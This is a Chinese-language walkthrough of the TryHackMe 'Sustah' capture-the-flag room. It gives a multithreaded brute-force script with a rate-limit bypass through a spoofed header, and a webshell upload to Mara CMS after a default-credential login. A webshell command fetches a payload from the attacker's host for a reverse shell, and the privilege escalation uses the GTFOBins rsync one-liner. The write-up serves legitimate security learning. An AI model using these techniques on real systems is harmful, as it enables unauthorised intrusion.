# Sustah Writeup
> URL : https://tryhackme.com/room/sustah

IP : 10.10.252.122

## Recon
- 掃 Port
	- `rustscan -a 10.10.252.122 -r 1-65535`
		- ![](https://i.imgur.com/Hn5pZPX.png)
	- `nmap -A -p22,80,8085 10.10.252.122`
		- ![](https://i.imgur.com/XFGhbeq.png)
		- gunicorn 20.0.4 
- 觀察首頁
	- ![](https://i.imgur.com/Yf78MKv.jpg)
	- 啥都ㄇ有
	- 掃目錄
		- ![](https://i.imgur.com/aljCOjz.png)
		- 也沒東西
- 觀察 8085 port 
	- ![](https://i.imgur.com/7KwmzSk.png)
	- 看起來像是幸運轉盤
	- 掃目錄
		- ![](https://i.imgur.com/MnxxFI6.png)
		- 有一個 ping 他只會回 pong
## 爆數字
- 下面有一個猜數字遊戲
	- ![](https://i.imgur.com/2R9ESg5.png)
	- 他說我有 0.004% 的勝率
	- 先測一下能不能爆破
```python
from bs4 import BeautifulSoup
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://10.10.252.122:8085',
    'Connection': 'keep-alive',
    'Referer': 'http://10.10.252.122:8085/home',
    'Upgrade-Insecure-Requests': '1',
}

data = {
  'number': '123'
}

for i in range(100):
    response = requests.post('http://10.10.252.122:8085/home', headers=headers, data=data)
    soup = BeautifulSoup(response.text,'html.parser')
    try:
        print(soup.find('h3').text)
    except:
        print(soup)
```
- 發現次數過多他會噴 
	- `{"error":"rate limit execeeded"}`
	- ![](https://i.imgur.com/Ka1SXAx.png)
- 試了很多次發現
	- 帶 'X-Remote-Addr' : '127.0.0.1' 
	- 就不會噴錯了
- 計算一下 
	- `1/(0.004%) = 25000`
	- 所以猜測密碼在這之間
	- 寫腳本來爆一下
```python
from bs4 import BeautifulSoup
import requests
from multiprocessing import Process, Pool

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://10.10.252.122:8085',
    'Connection': 'keep-alive',
    'Referer': 'http://10.10.252.122:8085/home',
    'Upgrade-Insecure-Requests': '1',
    'X-Remote-Addr' : '127.0.0.1'
}


l = [i for i in range(25000)]

def meow(num):
    data = {
        'number': num
    }

    response = requests.post('http://10.10.252.122:8085/home', headers=headers, data=data)
    soup = BeautifulSoup(response.text,'html.parser')
    try:
        s = soup.find('h3').text 
        if 'Oh no!' not in s:
            print(num,s)
    except:
        print(soup , response.status_code)
p = Pool(200)
p.map(meow,l)
```
- 幾秒鐘就爆出來ㄌ
	- ![](https://i.imgur.com/ovEpSKA.png)
	- 10921
- 他回應我這個 `/YouGotTh3P@th/`
	- 加到 80 port 的 Path 上面
- 會出現一個 CMS
	- ![](https://i.imgur.com/G6gweDr.png)
## CMS
- 發現他是 Mara CMS
	- ![](https://i.imgur.com/pQKgc9o.png)
	- 預設可以用 `admin` / `changeme` 進行登入
- 登入完還要我趕快改密碼
	- ![](https://i.imgur.com/caUvVfd.png)
- 查詢相關 Exploit
	- https://www.exploit-db.com/exploits/48780
	- 目測是可以直接傳 webshell
- 那就給他直接傳下去ㄅ
	- ![](https://i.imgur.com/TDlZejC.png)
- 還真的可以
	- `http://10.10.252.122/YouGotTh3P@th/img/webshell.php?A=wget 10.13.21.55:8000/s -O /tmp/s`
		- 戳 reverse shell
		- ![](https://i.imgur.com/7JTOmDY.png)
## 提權
- `python3 -c "import pty;pty.spawn('/bin/bash')"`
- 試著用 LSE
	- `bash lse.sh -l1`
	- 看不出什麼東西 QQ
- 發現 find 指令被封鎖 QWQ
	- 提示說去找備份檔案
	- ![](https://i.imgur.com/gYLfB4Y.png)
	- 網路上看到兩種解法
		- `tar cf - $PWD 2>/dev/null | tar tvf - | grep backup`
			- 慢
		- `du -a 2>/dev/null  | grep backup`
			- 快
- 就找到了 `/usr/backups`
	- ![](https://i.imgur.com/amaWZB4.png)
- 觀察發現有一個隱藏檔 `.bak.passwd`
	- ![](https://i.imgur.com/EgM00gS.png)
	- 解開來看
		- ![](https://i.imgur.com/RMkPPLY.png)
	- 獲得帳號密碼
		- `kiran` / `trythispasswordforuserkiran`
- 透過 su 切過去
	- ![](https://i.imgur.com/PL9hiNi.png)
- 取得 User Flag
	- ![](https://i.imgur.com/B0lQJsK.png)
## 二次提權
- 起手式 `sudo -l`
	- ![](https://i.imgur.com/1L72E2i.png)
- 使用豌豆
	- ![](https://i.imgur.com/uhp6eWY.png)
	- 發現有一個 `doas` 酷指令，可以不用 suid 或 sudo
- 去 GTFOBins 尋找 rsync to shell
	- https://gtfobins.github.io/gtfobins/rsync/#suid
	- `rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`
	- ![](https://i.imgur.com/AutD5Og.png)
	- 成功提權
- 取得 Root Flag
	- ![](https://i.imgur.com/ci2EuFY.png)
